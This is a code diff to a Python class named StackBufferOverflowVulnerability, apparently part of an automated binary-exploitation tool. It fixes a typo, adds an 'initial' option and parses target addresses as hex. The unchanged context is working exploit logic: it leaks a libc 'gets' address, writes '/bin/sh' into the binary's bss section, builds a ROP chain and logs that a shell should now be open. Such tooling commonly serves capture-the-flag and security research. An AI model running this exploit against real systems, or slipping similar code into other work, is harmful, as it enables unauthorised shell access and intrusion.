@@ -53,7 +53,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
             targetFunc,
             functionExit,
             stackOffset,
-            suffix):
+            suffix,
+            initial):
         self.function = function
         self.binary = binary
         self.libc = libc
@@ -61,7 +62,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         self.stackOffset = stackOffset
         self.functionExit = functionExit
         self.suffix = suffix
-        self.initial = inital
+        self.initial = initial
     
     def __str__(self):
         fields = {
@@ -72,7 +73,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
             "targetFunc": str(self.targetFunc),
             "stackOffset": str(self.stackOffset),
             "options": {
-                "sbo.suffix": str(self.suffix)
+                "sbo.suffix": str(self.suffix),
+                "sbo.initial": str(self.initial)
             }
         }
         return json.dumps(fields, indent=2)
@@ -95,6 +97,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
                 suffix = options.get("sbo.suffix", None)
                 if suffix:
                     suffix = suffix.replace("\\n", "\n")
+                initial = options.get("sbo.initial", None)
                 if initial:
                     initial = initial.replace("\\n", "\n")
 
@@ -153,7 +156,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             sconn.recvuntil(self.initial)
         else:
             logger.info("Navigating to targetFunc.")
-            conn.navigate(self.targetFunc)
+            conn.navigate(int(self.targetFunc["address"],16))
 
         res = sconn.recv()
         logger.debug(f"Initial: {res}")
@@ -169,7 +172,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.debug(f"Received suffix: {res}")
         else:
             logger.info("Navigating to function exit")
-            conn.navigate(self.functionExit)
+            conn.navigate(int(self.functionExit,16))
 
         # We've hit the return, next output is now the 'gets' address
         gets_location = sconn.recvline()[:-1]
@@ -184,7 +187,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             sconn.recvuntil(self.initial)
         else:
             logger.info("Navigating to targetFunc.")
-            conn.navigate(self.targetFunc)
+            conn.navigate(int(self.targetFunc["address"],16))
 
         # send /bin/sh
         target_heap_address = self.binary.bss() + 0x100
@@ -204,7 +207,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.debug(f"Received suffix: {res}")
         else:
             logger.info("Navigating to function exit")
-            conn.navigate(self.functionExit)
+            conn.navigate(int(self.functionExit,16))
 
         # we have exited the function, we can now
         # write /bin/sh to a controlled part of memory
@@ -218,7 +221,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.debug(f"Received initial: {initial}")
         else:
             logger.info("Navigating to targetFunc.")
-            conn.navigate(self.targetFunc)
+            conn.navigate(int(self.targetFunc["address"],16))
 
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
@@ -238,6 +241,6 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.debug(f"Received suffix: {res}")
         else:
             logger.info("Navigating to function exit")
-            conn.navigate(self.functionExit)
+            conn.navigate(int(self.functionExit,16))
         
         logger.info("We should now have a shell.")
